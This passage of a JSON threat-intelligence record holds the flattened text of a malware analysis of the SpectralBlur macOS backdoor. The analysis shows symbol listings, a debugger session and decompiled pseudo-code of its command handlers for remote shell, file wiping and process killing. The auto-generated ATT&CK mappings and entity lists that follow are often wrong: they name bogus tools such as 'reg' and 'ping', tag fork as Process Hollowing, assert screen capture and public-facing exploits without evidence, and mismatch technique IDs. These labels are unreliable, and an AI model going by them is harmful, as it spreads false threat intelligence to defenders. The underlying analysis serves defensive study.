_proc_stop 00000001000026b0 T _proc_testconn 0000000100002160 T _proc_upload 0000000100002040 T _proc_upload_content 00000001000015f0 T _read_packet 0000000100001930 T _save_config 0000000100001500 T _sigchild 00000001000011f0 T _socket_close 0000000100000d10 T _socket_connect 0000000100001140 T _socket_recv 00000001000010c0 T _socket_send 0000000100000be0 T _wait_read 0000000100001730 T _write_packet 00000001000017e0 T _write_packet_value 0000000100001270 T _xcrypt Looks like functions dealing with a config (e.g.  load_config)  network communications (e.g.  socket_recv  socket_send)  and encryption (xcrypt). But also then  standard backdoor capabilities implemented (as noted by Greg)  in function prefixed with proc. And what about the APIs the malware imports to call into  Again we can use nm  this time the -u flag: 6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 4/11   nm -m SpectralBlur/.macshare _connect _dup2 _execve ... _fork _fread _fwrite ... _gethostbyname _getlogin _getpwuid _getsockopt _grantpt ... _ioctl _kill ... _pthread_create _rand _recv _send _socket _unlink _waitpid _write ... From these imports we can surmise that the malware performs file I/O (fread  fwrite  unlink)  network I/O (socket  recv  send)  and spawning/managing processes (execve  fork  kill). We ll see these APIs are invoked by the malware often in response to commands. For example  the malware s proc_rmfile function invokes the unlink API to remove a file: 1int proc_rmfile(int arg0  int arg1) { 2 var_10   arg1  3 var_18   var_10   0x10  4 ... 5 unlink(var_18)  6 ... Based on this triage (and Greg s report)  we ve developed what is likely a reasonable understanding of the malware. Still  its always good to validate triages with continued static  but also dynamical analysis. So  onward  Analysis At the start of the malware disassembly it calls into a function named init. Here  it builds a path to its config  and then opens it. The path is built by appending .d to the malware s binary full path: 6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 5/11 init(...){ _sprintf_chk(config  0x0  0x41a    s.d   malwaresPath)  ... loadConfig(...) } We can confirm this in a debugger  where at a call to fopen (in the load_config function) the malware will attempt to open the file macshare.d  in the directory where the malware is currently running (e.g. /Users/user/Downloads/).   lldb /Users/user/Downloads/macshare (lldb)   thread  1  queue    com.apple.main-thread  macshare load_config: -  0x100001890   32 : callq 0x100003d8c   symbol stub for: fopen Target 0: (macshare) stopped. (lldb) x/s $rdi 0x100008820:  /Users/user/Downloads/macshare.d  We can also see this in a File Monitor:   ./FileMonitor.app/Contents/MacOS/FileMonitor -pretty -filter macshare {  event  :  ES_EVENT_TYPE_NOTIFY_OPEN    file  : {  destination  :  /Users/user/Downloads/macshare.d    process  : {  pid  : 6818   name  :  macshare    path  :  /Users/user/Downloads/macshare  } } } By looking at its cross-references (xrefs)  we can see the xcrypt function is invoked to encrypt/decrypt the malware s config and network traffic: 6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 6/11 XRefs to the xcrypt function  the xcrypt function according to ChatGPT appears to be a custom stream cipher. While static analysis shows that the key may be stored at the start of this config (address 0x100008c3a)  and set to random 64bit value:  qword_100008c3a   sign_extend_64(rand())   time(0x0)   sign_extend_64(rand()   rand())  Back to the config file  unfortunately  I (currently) don t have access an example config. Thus some of our continued analysis is based solely on static analysis. Once the init function returns (which loaded the config)  that malware performs a myriad of actions that appear to complicate dynamic analysis and perhaps detection. This including forking itself  but also setting up a pseduo-terminal via posix_openpt (as noted by Phil Stokes): Uses grantpt to set up a pseudo-terminal. Not seen that before. Interesting    Phil Stokes       (@philofishal) January 4  2024  this is followed by more forks  execs  and more. Again  if I had to guess  this simply to complicate analysis (and/or perhaps  making it a detached/ isolated  process complicated detections)  We ll also see that the psuedo-terminal is used to execute shell commands from the attacker s remote C C server. Regardless we can skip over this all  and simply continue execution (or static analysis) where a new thread (named _mainthread) is spawned. After invoking functions such as openchannel and socket_connect to likely connect to its C C server (whose address likely would be found in the malware s config: macshare.d)  it invokes a function named mainprocess. The mainprocess function (eventually) invokes the read_packet function which appears to return the index of a command. The code in mainprocess function then iterates over an array named _procs in order to find the handler for the specified command (that I ve 6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 7/11 named commandHandler in the below disassembly). The command handler is then directly invoked: 1int mainprocess(int arg0  int arg1) { 2 3 var_558   read_packet(...)  4 if (var_558    0x0) goto loc_100002dfc  5 6loc_100002dfc: 7 var_560    (var_558   0x8)  8 commandHandler   0x0  9 addrOfProcs   _procs  10 do { 11 var_5C1   0x0  12 if ( addrOfProcs    0x0) { 13 var_5C1   (var_568    0x0   0x1 : 0x0)   0xff  14 } 15 if ((var_5C1   0x1)    0x0) { 16 break  17 } 18 if ( addrOfProcs    var_560) { 19 commandHandler    (addrOfProcs   0x4)  20 } 21 addrOfProcs   addrOfProcs   0xc  22 } while (true)  23 24 25 var_538   (commandHandler)(var_530  var_558)  26 27} After creating a custom structure (procStruct) for this array  we can see each command number and its handler: 6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 8/11 procs: 0x0000000100008000 struct procStruct { 0x1  _proc_none } 0x000000010000800c struct procStruct { 0x2  _proc_shell } 0x0000000100008018 struct procStruct { 0x3  _proc_dir } 0x0000000100008024 struct procStruct { 0x4  _proc_upload } 0x0000000100008030 struct procStruct { 0x5  _proc_upload_content } 0x000000010000803c struct procStruct { 0x6  _proc_download } 0x0000000100008048 struct procStruct { 0x7  _proc_rmfile } 0x0000000100008054 struct procStruct { 0x8  _proc_testconn } 0x0000000100008060 struct procStruct { 0x9  _proc_getcfg } 0x000000010000806c struct procStruct { 0xa  _proc_setcfg } 0x0000000100008078 struct procStruct { 0xb  _proc_hibernate } 0x0000000100008084 struct procStruct { 0xc  _proc_sleep } 0x0000000100008090 struct procStruct { 0xd  _proc_die } 0x000000010000809c struct procStruct { 6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 9/11 0xe  _proc_stop } 0x00000001000080a8 struct procStruct { 0xf  _proc_restart } Recall we saw the names of each command handler (_proc_ ) in the output of nm. And  though we can guess the likely capability of eahc command from its name  let s look a few to confirm. The proc_rmfile will remove a file by invoking the unlink API. However  we can also see that it first opens the file (fopen) and overwrites its contents with zero: 1int proc_rmfile(int arg0  int arg1) { 2 var_4   arg0  3 var_10   arg1  4 var_18   var_10   0x10  5 file   fopen(var_18   rb  )  6 if (file    0x0) { 7 fseek(file  0x0  0x2)  8 var_28   ftell(file)  9 fseek(file  0x0  0x0)  10 var_30   0x5000  11 if (var_28   var_30) { 12 var_30   var_28  13 } 14 var_38   malloc(var_30)  15 _memset_chk(var_38  0x0  var_30  0xffffffffffffffff)  16 fwrite(var_38  0x1  var_30  file)  17 free(var_38)  18 fclose(file)  19 } 20 rdx   unlink(var_18)  21 rax   0x0  22 if (rdx    0x0) { 23 rax   0x1  24 } 25 return _write_packet_value(var_4   var_10  rax)  26}  each command will also report a result by invoking the malware write_packet_value API. The proc_restart will terminate the child process: 6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 10/11 1int main(...) 2 3 call fork 4 mov dword [childPID]  eax 5 6int proc_restart(int arg0  int arg1) 7 8 kill( childPID  0x9)  9 return write_packet_value(arg0   arg1  0x0)  Finally  let s look at the proc_shell  which executed a command by write ing to the pseudo-terminal that was opened (via posix_openpt) previously: 1int main(...) 2 3 call posix_openpt 4 mov dword [pt]  eax 5 6int proc_shell(...) { 7 var_8   arg0  8 var_10   arg1  9 if (write( pt  var_10   0x10  strlen(var_10   0x10))    0x0) { 10 var_4   _write_packet_value(var_8   var_10  0x0)  11 } The other commands execute actions consistent with their respective names. Conclusion Today we dug into SpectralBlur  a DPRK backdoor. Building upon Greg s research we further detailed its capabilities. Interested in learning more Mac Malware Analysis Techniques  6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 11/11",
            "commands": [],
            "file_paths": [
              "/FileMonitor.app/Contents/MacOS/FileMonitor",
              "/t.co/P2TGw98UR6",
              "/Users/user/Downloads/).",
              "/Users/user/Downloads/macshare.d\",",
              "/.macshare:",
              "/Users/Shared/.macshare.",
              "/objective-see.org/blog/blog_0x78.html",
              "/.macshare",
              "/Users/user/Downloads/macshare.d\"",
              "/blog/blog_0x78.html",
              "/"
            ],
            "registry_keys": []
          },
          "entities": {
            "malware": [
              "backdoor",
              "conti",
              "malware",
              "rat"
            ],
            "tools": [
              "at",
              "net",
              "ping",
              "reg",
              "sc"
            ],
            "threat_actors": [],
            "ips": [],
            "domains": [
              "FileMonitor.app",
              "SpectralBlur.zip",
              "com.apple.main",
              "mac.jpg",
              "objective-see.org",
              "pic.twitter.com",
              "t.co"
            ],
            "hashes": {
              "sha1": [
                "06c8c84fb0a85bdf3520608b0a5c910b77e3b8c1"
              ]
            }
          },
          "ttp_indicators": {
            "initial_access": [
              "Exploit Public-Facing Application"
            ],
            "defense_evasion": [
              "Obfuscated Files or Information"
            ],
            "collection": [
              "Archive Collected Data",
              "Screen Capture"
            ],
            "exfiltration": [
              "Exfiltration Over C2 Channel"
            ],
            "command_and_control": [
              "Application Layer Protocol"
            ]
          },
          "context": "\n**File System Activity:**\n- /FileMonitor.app/Contents/MacOS/FileMonitor\n- /t.co/P2TGw98UR6\n- /Users/user/Downloads/).\n- /Users/user/Downloads/macshare.d\",\n- /.macshare:\n\n**Network Indicators:**\n- com.apple.main\n- pic.twitter.com\n- objective-see.org\n- https://objective-see.org/blog/blog_0x78.html\n- mac.jpg\n- https://t.co/P2TGw98UR6\n- SpectralBlur.zip\n- FileMonitor.app\n- t.co\n\n**Key Security Terms:** terminate, execute, extract, c2, encrypt, create, download, malware, backdoor, delete"
        },
        "metadata": {
          "extraction_method": "LangChain-Enhanced",
          "nlp_processing_time_ms": 38.271,
          "llm_processing_time_ms": 2487.139
        }
      }
    ],
    "ttps": [
      {
        "ttp_id": "63aeec7a-07f5-4db4-8640-d97b31bdcd6d",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "Pseudo-Terminal",
        "attack_id": "T1094",
        "tactic": "Defense Evasion",
        "description": "The malware sets up a pseudo-terminal via grantpt",
        "confidence_score": 0.704,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.184,
          "tool_mentions": 1.0,
          "context_richness": 0.86,
          "multiple_sources": 0.5
        },
        "indicators": [
          "grantpt",
          "posix_openpt"
        ],
        "tools": [
          "reg",
          "SpectralBlur",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "f3691030-fbc2-49c3-a980-41f9d6a9931a",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "Network Communication",
        "attack_id": "T1043",
        "tactic": "Command and Control",
        "description": "The malware communicates with its C2 server",
        "confidence_score": 0.685,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.161,
          "tool_mentions": 1.0,
          "context_richness": 0.76,
          "multiple_sources": 0.5
        },
        "indicators": [
          "socket_recv",
          "socket_send"
        ],
        "tools": [
          "reg",
          "SpectralBlur",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "3b817673-7fef-4c12-acff-1d30dcf8bca1",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "Command and Scripting Interpreter",
        "attack_id": "T1059",
        "tactic": "Execution",
        "description": "The malware uses a shell to execute commands",
        "confidence_score": 0.656,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.184,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "/bin/sh",
          "SpectralBlur/.macshare"
        ],
        "tools": [
          "reg",
          "SpectralBlur",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "3c065de9-819d-4ba5-8050-bccbe733abe7",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "File and Directory Permissions Modification",
        "attack_id": "T1222",
        "tactic": "Privilege Escalation",
        "description": "The malware modifies file permissions to hide itself",
        "confidence_score": 0.656,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.184,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "/Users/Shared/.macshare",
          "macshare.d"
        ],
        "tools": [
          "reg",
          "SpectralBlur",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "e2c9f12d-f4cc-4f1c-8ef6-1f3bc7a3e5dd",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "Data Encrypted",
        "attack_id": "T1027",
        "tactic": "Exfiltration",
        "description": "The malware encrypts its config and network traffic",
        "confidence_score": 0.656,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.184,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "xcrypt function",
          "custom stream cipher"
        ],
        "tools": [
          "reg",
          "SpectralBlur",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "f59baba6-d7b3-4ae8-8672-a3ea66ebde69",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "Process Hollowing",
        "attack_id": "T1093",
        "tactic": "Defense Evasion",
        "description": "The malware forks itself to complicate dynamic analysis",
        "confidence_score": 0.656,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.184,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "fork",
          "posix_openpt"
        ],
        "tools": [
          "reg",
          "SpectralBlur",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "64a811d6-4e42-4a2a-8acf-95143de42d4d",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "Create or Modify System Process",
        "attack_id": "T1543",
        "tactic": "Persistence",
        "description": "The malware creates or modifies system processes",
        "confidence_score": 0.652,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.199,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "proc_testconn function"
        ],
        "tools": [
          "reg",
          "SpectralBlur",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "df615a20-db0d-481e-9756-99a591decd52",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "Process Creation",
        "attack_id": "T1055",
        "tactic": "Execution",
        "description": "The malware creates new processes",
        "confidence_score": 0.651,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.152,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "execve",
          "fork"
        ],
        "tools": [
          "reg",
          "SpectralBlur",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "45ff3ea1-3a0f-4a43-b99d-8379e04c252b",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "Data Staging",
        "attack_id": "T1074",
        "tactic": "Exfiltration",
        "description": "The malware uploads and downloads files",
        "confidence_score": 0.649,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.138,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "proc_upload function",
          "proc_download function"
        ],
        "tools": [
          "reg",
          "SpectralBlur",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "e67ea8bf-2c1e-4bb1-bc42-6c3b83c489ec",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "Indicator Removal on Host",
        "attack_id": "T1070",
        "tactic": "Defense Evasion",
        "description": "The malware removes indicators from the host",
        "confidence_score": 0.646,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.161,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "proc_rmfile function"
        ],
        "tools": [
          "reg",
          "SpectralBlur",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "e7be2904-214d-4a46-ac75-6cf84dc771b8",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "File and Directory Discovery",
        "attack_id": "T1083",
        "tactic": "Discovery",
        "description": "The malware gathers file and directory information",
        "confidence_score": 0.646,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.161,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "proc_dir function"
        ],
        "tools": [
          "reg",
          "SpectralBlur",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "3ece81df-b7ab-4d0b-a588-d93f18c8c1ee",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "System Network Connections Discovery",
        "attack_id": "T1049",
        "tactic": "Discovery",
        "description": "The malware gathers system network connections information",
        "confidence_score": 0.646,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.161,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "socket_connect"
        ],
        "tools": [
          "reg",
          "SpectralBlur",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "db9937db-109f-47f0-bddb-4c1320459dc7",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "System Information Discovery",
        "attack_id": "T1082",
        "tactic": "Discovery",
        "description": "The malware gathers system information",
        "confidence_score": 0.645,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.115,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "gethostbyname",
          "getlogin"
        ],
        "tools": [
          "reg",
          "SpectralBlur",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "8d31961f-3ac7-4452-9580-21799ff0ecc6",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "System Network Configuration Discovery",
        "attack_id": "T1016",
        "tactic": "Discovery",
        "description": "The malware gathers network configuration information",
        "confidence_score": 0.643,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.138,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "getsockopt"
        ],
        "tools": [
          "reg",
          "SpectralBlur",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "745eede0-841a-4b3e-9efb-60d8d11176ca",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "System Owner/User Discovery",
        "attack_id": "T1033",
        "tactic": "Discovery",
        "description": "The malware gathers system owner/user information",
        "confidence_score": 0.643,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.138,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "getpwuid"
        ],
        "tools": [
          "reg",
          "SpectralBlur",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "371f6daa-dbfa-4517-b092-9a76ecbd25ce",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "Application Window Discovery",
        "attack_id": "T1010",
        "tactic": "Discovery",
        "description": "The malware gathers application window information",
        "confidence_score": 0.643,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.138,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "proc_none function"
        ],
        "tools": [
          "reg",
          "SpectralBlur",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "6726c6a3-826f-4de3-a34a-15de553041de",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "System Time Discovery",
        "attack_id": "T1124",
        "tactic": "Discovery",
        "description": "The malware gathers system time information",
        "confidence_score": 0.643,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.138,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "time"
        ],
        "tools": [
          "reg",
          "SpectralBlur",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "9b22caa7-f7ca-4fc2-8338-793018aba7c8",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "File Deletion",
        "attack_id": "T1107",
        "tactic": "Defense Evasion",
        "description": "The malware deletes files",
        "confidence_score": 0.642,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.092,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "unlink API",
          "proc_rmfile function"
        ],
        "tools": [
          "reg",
          "SpectralBlur",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "7e324859-8d69-42d2-9516-95e1b10d3c1f",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "Input Capture",
        "attack_id": "T1056",
        "tactic": "Collection",
        "description": "The malware captures input",
        "confidence_score": 0.636,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.092,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "proc_getcfg function"
        ],
        "tools": [
          "reg",
          "SpectralBlur",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "a5815efa-7ada-45d0-a5b4-70aacab09398",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "Application Layer Protocol",
        "attack_id": "T1071",
        "tactic": "Command And Control",
        "description": "Detected Application Layer Protocol activity via NLP pattern matching",
        "confidence_score": 0.633,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.199,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "ee677673-a2ef-4779-873e-82aedd2258c1",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "Process Injection",
        "attack_id": "T1055.002",
        "tactic": "Defense Evasion",
        "description": "The malware injects processes",
        "confidence_score": 0.632,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.54,
          "description_detail": 0.13,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "_pthread_create"
        ],
        "tools": [
          "reg",
          "SpectralBlur",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "a2215e1c-1c16-4f0a-8abb-ec607816ce57",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "Obfuscated Files or Information",
        "attack_id": "T1027",
        "tactic": "Defense Evasion",
        "description": "Detected Obfuscated Files or Information activity via NLP pattern matching",
        "confidence_score": 0.631,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.185,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "b608f4ed-b47d-4955-b429-2044f8318a38",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "Exfiltration Over C2 Channel",
        "attack_id": "T1041",
        "tactic": "Exfiltration",
        "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
        "confidence_score": 0.631,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.185,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "6c97146f-9d3e-43d7-beee-9e18c201d569",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "Obfuscated Files or Information",
        "attack_id": "T1027.003",
        "tactic": "Exfiltration",
        "description": "The malware uses obfuscated strings",
        "confidence_score": 0.629,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.54,
          "description_detail": 0.115,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "obfuscated strings"
        ],
        "tools": [
          "reg",
          "SpectralBlur",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "cd275b9a-4e48-4554-9e6d-dd698629e02e",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "Exploit Public-Facing Application",
        "attack_id": "T1190",
        "tactic": "Initial Access",
        "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
        "confidence_score": 0.628,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.162,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "c76a062a-b765-41fd-81b9-2e8771a1f001",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "Archive Collected Data",
        "attack_id": "T1560",
        "tactic": "Collection",
        "description": "Detected Archive Collected Data activity via NLP pattern matching",
        "confidence_score": 0.628,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.162,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "fb4ee95b-12fa-4a4e-a999-ae29f9ad9e7d",
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "technique_name": "Screen Capture",
        "attack_id": "T1113",
        "tactic": "Collection",
        "description": "Detected Screen Capture activity via NLP pattern matching",
        "confidence_score": 0.624,
        "confidence_level": "medium",
        "confidence_breakdown": {
